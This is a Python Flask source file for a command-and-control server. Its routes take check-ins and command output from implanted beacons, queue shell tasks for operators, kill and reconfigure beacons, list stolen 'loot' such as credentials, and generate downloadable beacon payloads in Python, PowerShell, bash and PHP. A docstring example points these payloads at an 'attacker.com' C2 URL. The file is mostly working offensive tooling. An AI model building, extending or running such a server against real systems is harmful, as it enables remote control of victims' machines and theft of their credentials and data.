"""
C2 Beacon API Routes
Real beacon check-in/task/result endpoints
"""
from flask import Blueprint, request, jsonify, session, Response
from datetime import datetime

from cybermodules.c2_beacon import get_beacon_manager
from cybermodules.payload_generator import get_payload_generator

beacon_bp = Blueprint("beacon", __name__)


# ============== Beacon Communication Endpoints ==============
# These are called BY the beacon/agent

@beacon_bp.route("/c2/beacon/checkin", methods=["POST"])
def beacon_checkin():
    """
    Beacon check-in endpoint
    Called by agent to register or check for tasks
    
    Request:
    {
        "id": "uuid or null for new",
        "hostname": "DESKTOP-ABC",
        "username": "admin",
        "os": "Windows 10",
        "arch": "x64",
        "pid": 1234,
        "ip_internal": "192.168.1.100",
        "integrity": "high"
    }
    
    Response:
    {
        "status": "ok",
        "tasks": [...],
        "sleep": 30,
        "jitter": 10
    }
    """
    try:
        data = request.get_json() or {}
        remote_ip = request.remote_addr
        
        manager = get_beacon_manager()
        response = manager.handle_checkin(data, remote_ip)
        
        return jsonify(response)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@beacon_bp.route("/c2/beacon/result/<beacon_id>", methods=["POST"])
def beacon_result(beacon_id: str):
    """
    Receive task result from beacon
    
    Request:
    {
        "task_id": "uuid",
        "output": "command output...",
        "success": true,
        "loot_type": "credentials" (optional)
    }
    """
    try:
        data = request.get_json() or {}
        
        manager = get_beacon_manager()
        response = manager.handle_result(beacon_id, data)
        
        return jsonify(response)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ============== Operator Management Endpoints ==============
# These are called BY the operator/UI

@beacon_bp.route("/c2/beacons", methods=["GET"])
def list_beacons():
    """List all beacons"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    status = request.args.get("status")
    manager = get_beacon_manager()
    beacons = manager.list_beacons(status)
    
    return jsonify({
        "success": True,
        "beacons": beacons,
        "total": len(beacons)
    })


@beacon_bp.route("/c2/beacons/<beacon_id>", methods=["GET"])
def get_beacon(beacon_id: str):
    """Get single beacon details"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    manager = get_beacon_manager()
    beacon = manager.get_beacon(beacon_id)
    
    if not beacon:
        return jsonify({"error": "beacon_not_found"}), 404
    
    return jsonify({
        "success": True,
        "beacon": beacon
    })


@beacon_bp.route("/c2/beacons/<beacon_id>/task", methods=["POST"])
def queue_task(beacon_id: str):
    """
    Queue a task for beacon
    
    Request:
    {
        "command": "shell",
        "args": ["whoami"]
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    data = request.get_json() or {}
    command = data.get("command", "shell")
    args = data.get("args", [])
    
    manager = get_beacon_manager()
    
    # Verify beacon exists
    beacon = manager.get_beacon(beacon_id)
    if not beacon:
        return jsonify({"error": "beacon_not_found"}), 404
    
    task_id = manager.queue_task(beacon_id, command, args)
    
    return jsonify({
        "success": True,
        "task_id": task_id,
        "message": f"Task queued for beacon {beacon_id[:8]}..."
    })


@beacon_bp.route("/c2/beacons/<beacon_id>/kill", methods=["POST"])
def kill_beacon(beacon_id: str):
    """Kill/terminate a beacon"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    manager = get_beacon_manager()
    manager.kill_beacon(beacon_id)
    
    return jsonify({
        "success": True,
        "message": f"Kill command sent to beacon {beacon_id[:8]}..."
    })


@beacon_bp.route("/c2/beacons/<beacon_id>/config", methods=["POST"])
def update_beacon_config(beacon_id: str):
    """
    Update beacon configuration
    
    Request:
    {
        "sleep": 60,
        "jitter": 20
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    data = request.get_json() or {}
    sleep = data.get("sleep")
    jitter = data.get("jitter")
    
    manager = get_beacon_manager()
    manager.update_beacon_config(beacon_id, sleep, jitter)
    
    return jsonify({
        "success": True,
        "message": "Beacon config updated (will apply on next check-in)"
    })


@beacon_bp.route("/c2/tasks", methods=["GET"])
def list_tasks():
    """List all tasks"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    beacon_id = request.args.get("beacon_id")
    manager = get_beacon_manager()
    tasks = manager.get_tasks(beacon_id)
    
    return jsonify({
        "success": True,
        "tasks": tasks
    })


# ============== Payload Generator Endpoints ==============

@beacon_bp.route("/c2/payloads/types", methods=["GET"])
def list_payload_types():
    """List available payload types"""
    generator = get_payload_generator()
    return jsonify({
        "success": True,
        "types": generator.list_types()
    })


@beacon_bp.route("/c2/payloads/generate", methods=["POST"])
def generate_payload():
    """
    Generate beacon payload
    
    Request:
    {
        "type": "python",
        "c2_url": "http://attacker.com:8080/c2/beacon",
        "options": {
            "sleep": 30,
            "jitter": 10
        }
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    data = request.get_json() or {}
    payload_type = data.get("type", "python")
    c2_url = data.get("c2_url", request.url_root.rstrip('/') + "/c2/beacon")
    options = data.get("options", {})
    
    generator = get_payload_generator(c2_url)
    payload = generator.generate(payload_type, options)
    
    return jsonify({
        "success": True,
        "type": payload_type,
        "payload": payload,
        "c2_url": c2_url
    })


@beacon_bp.route("/c2/payloads/download/<payload_type>", methods=["GET"])
def download_payload(payload_type: str):
    """Download raw payload file"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    c2_url = request.args.get("c2_url", request.url_root.rstrip('/') + "/c2/beacon")
    sleep = int(request.args.get("sleep", 30))
    jitter = int(request.args.get("jitter", 10))
    
    generator = get_payload_generator(c2_url)
    payload = generator.generate(payload_type, {"sleep": sleep, "jitter": jitter})
    
    # Determine file extension
    extensions = {
        "python": "py",
        "python_oneliner": "txt",
        "powershell": "ps1",
        "powershell_encoded": "txt",
        "bash": "sh",
        "php": "php"
    }
    ext = extensions.get(payload_type, "txt")
    filename = f"beacon_{payload_type}.{ext}"
    
    return Response(
        payload,
        mimetype="text/plain",
        headers={"Content-Disposition": f"attachment;filename={filename}"}
    )


@beacon_bp.route("/c2/loot", methods=["GET"])
def list_loot():
    """List all collected loot"""
    if not session.get("logged_in"):
        return jsonify({"error": "unauthorized"}), 401
    
    manager = get_beacon_manager()
    loot = manager.get_loot()
    
    return jsonify({
        "success": True,
        "loot": loot
    })


@beacon_bp.route("/c2/stats", methods=["GET"])
def get_stats():
    """Get C2 statistics"""
    manager = get_beacon_manager()
    beacons = manager.list_beacons()
    
    active = len([b for b in beacons if b.get("status") == "active"])
    dormant = len([b for b in beacons if b.get("status") == "dormant"])
    dead = len([b for b in beacons if b.get("status") == "dead"])
    
    return jsonify({
        "success": True,
        "stats": {
            "total_beacons": len(beacons),
            "active": active,
            "dormant": dormant,
            "dead": dead,
            "tasks_total": len(manager.get_tasks()),
            "tasks_pending": len([t for t in manager.get_tasks() if t.get("status") == "pending"]),
            "loot_count": len(manager.get_loot())
        }
    })
